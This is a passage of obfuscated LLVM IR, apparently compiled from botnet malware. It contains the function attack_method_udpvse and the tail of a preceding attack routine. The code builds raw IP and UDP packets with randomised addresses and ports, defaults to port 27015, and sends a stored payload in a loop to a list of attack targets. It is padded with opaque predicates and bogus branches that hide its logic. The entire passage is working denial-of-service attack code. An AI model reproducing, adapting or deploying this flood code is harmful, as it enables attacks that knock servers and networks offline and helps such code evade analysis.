  %593 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i32 0, i32 2
  %594 = load i8, i8* %593, align 4
  %595 = zext i8 %594 to i32
  %_ = sub i32 0, %588
  %gen = add i32 %_, %595
  %_23 = sub i32 %588, %595
  %gen24 = mul i32 %_23, %595
  %_25 = sub i32 0, %588
  %gen26 = add i32 %_25, %595
  %_27 = sub i32 0, %588
  %gen28 = add i32 %_27, %595
  %_29 = sub i32 %588, %595
  %gen30 = mul i32 %_29, %595
  %596 = lshr i32 %588, %595
  %597 = add i32 %587, %596
  %598 = call i32 @htonl(i32 %597) #7
  %599 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %600 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %599, i32 0, i32 9
  store i32 %598, i32* %600, align 4
  br label %originalBB22

originalBB34alteredBB:                            ; preds = %originalBB34, %335
  %601 = call i32 @rand_next()
  %602 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 8
  store i32 %601, i32* %603, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %355
  %604 = load i16, i16* %21, align 2
  %605 = zext i16 %604 to i32
  %606 = icmp eq i32 %605, 65535
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %393
  %607 = call i32 @rand_next()
  %608 = trunc i32 %607 to i16
  %609 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %610 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %609, i32 0, i32 1
  store i16 %608, i16* %610, align 2
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %414
  %611 = load i8, i8* %27, align 1
  %612 = icmp ne i8 %611, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %484
  %613 = load i32, i32* %17, align 4
  %_51 = shl i32 %613, 1
  %_52 = sub i32 0, %613
  %gen53 = add i32 %_52, 1
  %_54 = sub i32 %613, 1
  %gen55 = mul i32 %_54, 1
  %_56 = shl i32 %613, 1
  %_57 = sub i32 0, %613
  %gen58 = add i32 %_57, 1
  %614 = add nsw i32 %613, 1
  store i32 %614, i32* %17, align 4
  br label %originalBB50
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.35
  %6 = load i32, i32* @y.36
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 8) #6
  %38 = bitcast i8* %37 to i8**
  store i8** %38, i8*** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 2, i32 0)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %20, align 1
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 3, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 4, i32 64)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %22, align 1
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 5, i32 0)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = load i8, i8* %15, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 6, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %24, align 2
  %59 = load i8, i8* %15, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 7, i32 27015)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %25, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %63 = call i8* @table_retrieve_val(i32 20, i32* %27)
  store i8* %63, i8** %26, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %18, align 4
  %65 = icmp eq i32 %64, -1
  %66 = load i32, i32* @x.35
  %67 = load i32, i32* @y.36
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %65, label %74, label %75

; <label>:74:                                     ; preds = %originalBBpart2
  br label %480

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = load i32, i32* @x.35
  %77 = load i32, i32* @y.36
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  store i32 1, i32* %17, align 4
  %84 = load i32, i32* %18, align 4
  %85 = bitcast i32* %17 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  %88 = load i32, i32* @x.35
  %89 = load i32, i32* @y.36
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %87, label %96, label %99

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i32, i32* %18, align 4
  %98 = call i32 @close(i32 %97)
  br label %480

; <label>:99:                                     ; preds = %originalBBpart24
  store i32 0, i32* %17, align 4
  br label %100

; <label>:100:                                    ; preds = %208, %99
  %101 = load i32, i32* %17, align 4
  %102 = load i8, i8* %13, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  br i1 %104, label %105, label %211

; <label>:105:                                    ; preds = %100
  %106 = call noalias i8* @calloc(i64 128, i64 1) #6
  %107 = load i8**, i8*** %19, align 8
  %108 = load i32, i32* %17, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %19, align 8
  %112 = load i32, i32* %17, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %28, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %29, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to i8*
  store i8* %122, i8** %30, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = and i8 %125, 15
  %127 = or i8 %126, 64
  store i8 %127, i8* %124, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, -16
  %132 = or i8 %131, 5
  store i8 %132, i8* %129, align 4
  %133 = load i8, i8* %20, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i32, i32* %27, align 4
  %137 = sext i32 %136 to i64
  %138 = add i64 32, %137
  %139 = trunc i64 %138 to i16
  %140 = call zeroext i16 @htons(i16 zeroext %139) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 2
  store i16 %140, i16* %142, align 2
  %143 = load i16, i16* %21, align 2
  %144 = call zeroext i16 @htons(i16 zeroext %143) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 3
  store i16 %144, i16* %146, align 4
  %147 = load i8, i8* %22, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 5
  store i8 %147, i8* %149, align 4
  %150 = load i8, i8* %23, align 1
  %151 = icmp ne i8 %150, 0
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %105
  %153 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 4
  store i16 %153, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %152, %105
  %157 = load i32, i32* @x.35
  %158 = load i32, i32* @y.36
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %156
  %165 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 17, i8* %166, align 1
  %167 = load i32, i32* @LOCAL_ADDR, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %171 = load i32, i32* %17, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %24, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 2
  %182 = load i16, i16* %25, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %27, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 12, %187
  %189 = trunc i64 %188 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %192 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %191, i32 0, i32 2
  store i16 %190, i16* %192, align 2
  %193 = load i8*, i8** %30, align 8
  %194 = bitcast i8* %193 to i32*
  store i32 -1, i32* %194, align 4
  %195 = load i8*, i8** %30, align 8
  %196 = getelementptr inbounds i8, i8* %195, i64 4
  store i8* %196, i8** %30, align 8
  %197 = load i8*, i8** %30, align 8
  %198 = load i8*, i8** %26, align 8
  %199 = load i32, i32* %27, align 4
  call void @util_memcpy(i8* %197, i8* %198, i32 %199)
  %200 = load i32, i32* @x.35
  %201 = load i32, i32* @y.36
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %208

; <label>:208:                                    ; preds = %originalBBpart211
  %209 = load i32, i32* %17, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %17, align 4
  br label %100

; <label>:211:                                    ; preds = %100
  %212 = load i32, i32* @x.35
  %213 = load i32, i32* @y.36
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %211
  %220 = load i32, i32* @x.35
  %221 = load i32, i32* @y.36
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %228

; <label>:228:                                    ; preds = %479, %originalBBpart215
  %229 = load i32, i32* @x.35
  %230 = load i32, i32* @y.36
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %228
  store i32 0, i32* %17, align 4
  %237 = load i32, i32* @x.35
  %238 = load i32, i32* @y.36
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %245

; <label>:245:                                    ; preds = %originalBBpart255, %originalBBpart219
  %246 = load i32, i32* @x.35
  %247 = load i32, i32* @y.36
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %245
  %254 = load i32, i32* %17, align 4
  %255 = load i8, i8* %13, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp slt i32 %254, %256
  %258 = load i32, i32* @x.35
  %259 = load i32, i32* @y.36
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %257, label %266, label %479

; <label>:266:                                    ; preds = %originalBBpart223
  %267 = load i32, i32* @x.35
  %268 = load i32, i32* @y.36
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %266
  %275 = load i8**, i8*** %19, align 8
  %276 = load i32, i32* %17, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds i8*, i8** %275, i64 %277
  %279 = load i8*, i8** %278, align 8
  store i8* %279, i8** %31, align 8
  %280 = load i8*, i8** %31, align 8
  %281 = bitcast i8* %280 to %struct.iphdr*
  store %struct.iphdr* %281, %struct.iphdr** %32, align 8
  %282 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i64 1
  %284 = bitcast %struct.iphdr* %283 to %struct.udphdr*
  store %struct.udphdr* %284, %struct.udphdr** %33, align 8
  %285 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %286 = load i32, i32* %17, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = icmp slt i32 %291, 32
  %293 = load i32, i32* @x.35
  %294 = load i32, i32* @y.36
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %292, label %301, label %322

; <label>:301:                                    ; preds = %originalBBpart227
  %302 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %303 = load i32, i32* %17, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %311 = load i32, i32* %17, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %301, %originalBBpart227
  %323 = load i16, i16* %21, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  br i1 %325, label %326, label %347

; <label>:326:                                    ; preds = %322
  %327 = load i32, i32* @x.35
  %328 = load i32, i32* @y.36
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %326
  %335 = call i32 @rand_next()
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  %339 = load i32, i32* @x.35
  %340 = load i32, i32* @y.36
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %347

; <label>:347:                                    ; preds = %originalBBpart231, %322
  %348 = load i32, i32* @x.35
  %349 = load i32, i32* @y.36
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %347
  %356 = load i16, i16* %24, align 2
  %357 = zext i16 %356 to i32
  %358 = icmp eq i32 %357, 65535
  %359 = load i32, i32* @x.35
  %360 = load i32, i32* @y.36
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %358, label %367, label %372

; <label>:367:                                    ; preds = %originalBBpart235
  %368 = call i32 @rand_next()
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 0
  store i16 %369, i16* %371, align 2
  br label %372

; <label>:372:                                    ; preds = %367, %originalBBpart235
  %373 = load i32, i32* @x.35
  %374 = load i32, i32* @y.36
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %372
  %381 = load i16, i16* %25, align 2
  %382 = zext i16 %381 to i32
  %383 = icmp eq i32 %382, 65535
  %384 = load i32, i32* @x.35
  %385 = load i32, i32* @y.36
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %383, label %392, label %397

; <label>:392:                                    ; preds = %originalBBpart239
  %393 = call i32 @rand_next()
  %394 = trunc i32 %393 to i16
  %395 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %396 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %395, i32 0, i32 1
  store i16 %394, i16* %396, align 2
  br label %397

; <label>:397:                                    ; preds = %392, %originalBBpart239
  %398 = load i32, i32* @x.35
  %399 = load i32, i32* @y.36
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %397
  %406 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %409 = bitcast %struct.iphdr* %408 to i16*
  %410 = call zeroext i16 @checksum_generic(i16* %409, i32 20)
  %411 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 7
  store i16 %410, i16* %412, align 2
  %413 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %414 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %413, i32 0, i32 3
  store i16 0, i16* %414, align 2
  %415 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %416 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %417 = bitcast %struct.udphdr* %416 to i8*
  %418 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %419 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %418, i32 0, i32 2
  %420 = load i16, i16* %419, align 2
  %421 = load i32, i32* %27, align 4
  %422 = sext i32 %421 to i64
  %423 = add i64 12, %422
  %424 = trunc i64 %423 to i32
  %425 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %415, i8* %417, i16 zeroext %420, i32 %424)
  %426 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %427 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %426, i32 0, i32 3
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 1
  %430 = load i16, i16* %429, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %432 = load i32, i32* %17, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 1
  store i16 %430, i16* %436, align 2
  %437 = load i32, i32* %18, align 4
  %438 = load i8*, i8** %31, align 8
  %439 = load i32, i32* %27, align 4
  %440 = sext i32 %439 to i64
  %441 = add i64 32, %440
  %442 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %443 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %444 = load i32, i32* %17, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = bitcast %struct.sockaddr_in* %447 to %struct.sockaddr*
  store %struct.sockaddr* %448, %struct.sockaddr** %442, align 8
  %449 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %450 = load %struct.sockaddr*, %struct.sockaddr** %449, align 8
  %451 = call i64 @sendto(i32 %437, i8* %438, i64 %441, i32 16384, %struct.sockaddr* %450, i32 16)
  %452 = load i32, i32* @x.35
  %453 = load i32, i32* @y.36
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart251, label %originalBB41alteredBB

originalBBpart251:                                ; preds = %originalBB41
  br label %460

; <label>:460:                                    ; preds = %originalBBpart251
  %461 = load i32, i32* @x.35
  %462 = load i32, i32* @y.36
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %460
  %469 = load i32, i32* %17, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %17, align 4
  %471 = load i32, i32* @x.35
  %472 = load i32, i32* @y.36
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %245

; <label>:479:                                    ; preds = %originalBBpart223
  br label %228

; <label>:480:                                    ; preds = %96, %74
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %481 = alloca i8, align 1
  %482 = alloca %struct.attack_target*, align 8
  %483 = alloca i8, align 1
  %484 = alloca %struct.attack_option*, align 8
  %485 = alloca i32, align 4
  %486 = alloca i32, align 4
  %487 = alloca i8**, align 8
  %488 = alloca i8, align 1
  %489 = alloca i16, align 2
  %490 = alloca i8, align 1
  %491 = alloca i8, align 1
  %492 = alloca i16, align 2
  %493 = alloca i16, align 2
  %494 = alloca i8*, align 8
  %495 = alloca i32, align 4
  %496 = alloca %struct.iphdr*, align 8
  %497 = alloca %struct.udphdr*, align 8
  %498 = alloca i8*, align 8
  %499 = alloca i8*, align 8
  %500 = alloca %struct.iphdr*, align 8
  %501 = alloca %struct.udphdr*, align 8
